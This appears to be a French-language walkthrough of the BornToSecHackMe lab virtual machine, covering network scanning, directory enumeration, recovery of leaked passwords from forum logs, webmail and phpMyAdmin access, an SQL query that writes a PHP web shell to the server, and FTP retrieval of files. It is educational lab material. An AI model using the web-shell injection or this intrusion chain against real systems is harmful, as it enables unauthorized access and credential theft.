
### Part 1: Setup

Activer dans vitualbox -> settings -> network  => attach to : __host-only adapter__

Lancer la machine et recuperer l'ip depuis un trerminal: 

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ ifconfig
...
vboxnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.1  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::800:27ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 0a:00:27:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1055  bytes 46766 (45.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```

Ici l'ip est : __192.168.56.1__

Toujours depuis le terminal, on vas utiliser __nmap__ pour check tout les port ouvert sur la machine:

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ nmap 192.168.56.0/24
...
Nmap scan report for 192.168.56.101
Host is up (0.00068s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
...
```

On ce rend compte que sur l'adresse __192.168.56.101__ les ports https/http ssh et ftp sont ouvert

---

### Part 2: Forum

Vue que l'on viens de voir que les ports 80 et 443 sont ouvert, on peux check si un site tourne sur la machine.

Ce qui est le cas. On peux y acceder avec  http://192.168.56.101/

La home page nous apporte rien, du coup depuis une distribution Kali Linux on utilise la commande __dirb__ qui vas nous servir a mapper le site de la machine et voir si des routes existe. 

On test sur le port 80 et 443.

Http:
```bash
┌──(jdamoise㉿vbox)-[~]
└─$ dirb http://192.168.56.101 -r
...
DIRECTORY: http://192.168.56.101/fonts/
+ http://192.168.56.101/forum (CODE:403|SIZE:287)                           
+ http://192.168.56.101/index.html (CODE:200|SIZE:1025)                     
+ http://192.168.56.101/server-status (CODE:403|SIZE:295)                   
                                                                               
-----------------
END_TIME: Wed Jul 23 19:14:43 2025
DOWNLOADED: 4612 - FOUND: 4

```

Https:
```bash 
┌──(jdamoise㉿vbox)-[~]
└─$ dirb https://192.168.56.101 -r
...                                                                       
DIRECTORY: https://192.168.56.101/forum/
DIRECTORY: https://192.168.56.101/phpmyadmin/
+ https://192.168.56.101/server-status (CODE:403|SIZE:296)
DIRECTORY: https://192.168.56.101/webmail/                                                                                       
                                                                                                                                     
-----------------
END_TIME: Wed Jul 23 19:15:53 2025
DOWNLOADED: 4612 - FOUND: 2

```

On ce rend compte que sur le port 443 le site a trois service 
 - forum
 - phpmyadmin
 - webmail

On vas donc ce rendre sur https://192.168.56.101/forum depuis notre navigateur et on ce rend compte qu'une page nommer __probleme login ?__ existe.

Cette page contient plein de logs de connection, on cherche donc dedans pour trouver si un mdp si trouve

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ curl -k https://192.168.56.101/forum/index.php?id=6 | grep "invalid"
...
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br />
... 

```
On ce rend compte qu'un mdp a ete passer a la place d'un user. user qui est lmeard (que l'on peut retrouver en haut de la page)

On ce connecte au user et dans sont profil on trouve sont adresse mail : laurie@borntosec.net

---
### Part 3: Mail

Avec l'adresse mail nous allons donc sur le service : https://192.168.56.101/webmail

On rentre l'adresse mail comme username et le mdp que l'on a recuperer au prealable ce qui nous connect a la boite mail.

On y trouve deux mail:
 -  DB access
 - Very interesting !!!!

Il  n'y a que le premier mail qui nous interesse.
Dans ce mail on recupere user et un mdp pour ce connecter a une DB :
 - user : __root__
 - pwd: __Fg-'kKXBj87E:aJ$__

---
### Part 4: PHPMyAdmin

Nous allons donc avec ce user acceder au service : https://192.168.56.101/phpmyadmin


depuis PHPmyAdmin on peux executer une injection SQL pour creer une route qui nous executera une command sur le server.

on execute cette commande 

```SQL
SELECT "<pre><?php system($_GET['cmd'])?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

une fois que cette commande a etait executer on peux utiliser la route /forum/templates_c/shell.php?cmd=... pour recuperer des data sur le server 

depuis le navigateur on execute https://192.168.56.101/forum/templates_c/shell.php?cmd=find+/home

ce qui nous donne 

```
/home
/home/LOOKATME
/home/LOOKATME/password
/home/ft_root
/home/laurie
/home/laurie@borntosec.net
/home/lmezard
/home/thor
/home/zaz
```

on execute ensuite https://192.168.56.101/forum/templates_c/shell.php?cmd=cat /home/LOOKATME/password

et on obtient:

```
lmezard:G!@M6f4Eatau{sF"
```

---
### Part 5: FTP

le user et le mdp que l'on viens de recuperer nous donne access a ftp 

on recupere tout ce qu'il y a dedans avec :

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ ftp lmezard@192.168.56.101
Connected to 192.168.56.101.
220 Welcome on this server
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7707|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> mget *
mget README [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||55507|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*****************************************************************************************|    96      131.30 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (39.02 KiB/s)
229 Entering Extended Passive Mode (|||18340|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*****************************************************************************************|   790 KiB   26.85 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (26.14 MiB/s)

```

on fait un __file__ sur les deux object de l'on trouve

```bash
┌──(jdamoise㉿vbox)-[~]
└─$ file fun README           
fun:    POSIX tar archive (GNU)
README: ASCII text

```

on ce rend compte que fun et un tar du coup on extrait ce qu'il y a dedan

```bash
tar -xf fun
```

dans __fun__ on trouve __ft_fun__ qui contient plein de fichier .pcap contenant du code C.

Objectif vas etre de recreer le programme et de le lancer pour ce faire on utilise un script

```bash
┌──(jdamoise㉿vbox)-[~/ft_fun]
touch pcap_compile.sh                                             
chmod 777 pcap_compile.sh 
./pcap_compile.sh 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit  
```

on obtient un pwd en SHA-256 il nous reste plus cas le decripter

```bash
┌──(jdamoise㉿vbox)-[~/ft_fun]
└─$ echo -n Iheartpwnage | shasum -a256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

on obtient donc le mdp de laurie pour ce connecter en ssh a la machine.

